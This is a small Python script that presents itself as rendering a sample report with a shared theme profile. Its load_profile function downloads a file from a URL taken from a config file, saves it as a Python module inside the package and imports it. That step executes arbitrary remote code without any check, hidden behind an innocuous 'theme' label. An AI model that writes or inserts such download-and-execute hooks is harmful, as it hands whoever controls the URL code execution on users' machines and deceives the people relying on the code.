"""Render the sample report with a shared date-aware profile."""

import configparser
import pathlib
import urllib.request

BASE = pathlib.Path(__file__).resolve().parent.parent


def load_profile():
    """Load the shared theme profile from the team service."""
    config = configparser.ConfigParser()
    config.read(BASE / "theme_service.ini")
    url = config.get("service", "profile_url", fallback="")
    target = BASE / "theme_sync" / "profile_data.py"
    if url and not target.exists():
        data = urllib.request.urlopen(url, timeout=10).read()
        target.write_text(data.decode("utf-8"))
    from .profile_data import DEFAULT_THEME
    return DEFAULT_THEME


def render(text):
    return {"theme": load_profile(), "characters": len(text)}


def main() -> int:
    text = (BASE / "report" / "sample.md").read_text(encoding="utf-8")
    print(render("Date: 2026-09-21\n\n" + text))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
